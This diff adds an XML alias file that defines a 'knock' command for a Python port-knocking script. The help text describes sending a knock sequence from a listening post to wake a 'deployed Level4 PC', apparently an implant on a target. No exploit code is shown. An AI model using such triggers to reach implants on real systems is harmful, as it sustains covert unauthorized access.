@@ -1,0 +1,43 @@
+<?xml version='1.0' ?>
+
+<Aliases>
+	<Alias>
+		<Name>knock</Name>
+		<ReplaceBeforeArgs>python PortKnock/_Knock.py -args "</ReplaceBeforeArgs>
+		<ReplaceAfterArgs>"</ReplaceAfterArgs>
+
+		<Help>knock</Help>
+		<Help>    Sends a PC/WP port knock trigger to a deployed Level4 PC. Args -dest and -k1 are required.</Help>
+		<Help></Help>
+		<Help>  [-dest &lt;IP address&gt;]</Help>
+		<Help>     IPv4 or IPv6 address of target.</Help>
+		<Help>  [-src &lt;IP address&gt;]</Help>
+		<Help>     IPv4 or IPv6 address to send from on the LP (optional... default is generally OK!).</Help>
+		<Help>  [-k1 &lt;dstPort [srcPort [srcPortChoices]]]&gt;</Help>
+		<Help>     The knocking specification to use. Ex: 80, 443 2001, or 25 4900 100</Help>
+		<Help>     This is the first in a sequence of up to five knocking specifications.</Help>
+		<Help>     If srcPort is absent or 0, OS picks source port.</Help>
+		<Help>     Otherwise, source port will be as requested if srcPortChoices is absent.</Help>
+		<Help>     With all three args, it will be chosen at random from between srcPort</Help>
+		<Help>     and srcPort + srcPortChoices (inclusive).</Help>
+		<Help>     Ideally, matches the preconfigured specification on the target!</Help>
+		<Help>  [-k2 &lt;dstPort [srcPort [srcPortChoices]]]&gt;</Help>
+		<Help>     Second knock, if applicable. See -k1 help.</Help>
+		<Help>  [-k3 &lt;dstPort [srcPort [srcPortChoices]]]&gt;</Help>
+		<Help>     Third knock, if applicable (ignored if -k2 missing). See -k1 help.</Help>
+		<Help>  [-k4 &lt;dstPort [srcPort [srcPortChoices]]]&gt;</Help>
+		<Help>     Fourth knock, if applicable (ignored if any prior knock missing). See -k1 help.</Help>
+		<Help>  [-k5 &lt;dstPort [srcPort [srcPortChoices]]]&gt;</Help>
+		<Help>     Fifth knock, if applicable (ignored if any prior knock missing). See -k1 help.</Help>
+		
+		<Options>
+			<Option>dest</Option>
+			<Option>src</Option>
+			<Option>k1</Option>
+			<Option>k2</Option>
+			<Option>k3</Option>
+			<Option>k4</Option>
+			<Option>k5</Option>
+		</Options>
+	</Alias>
+</Aliases>	
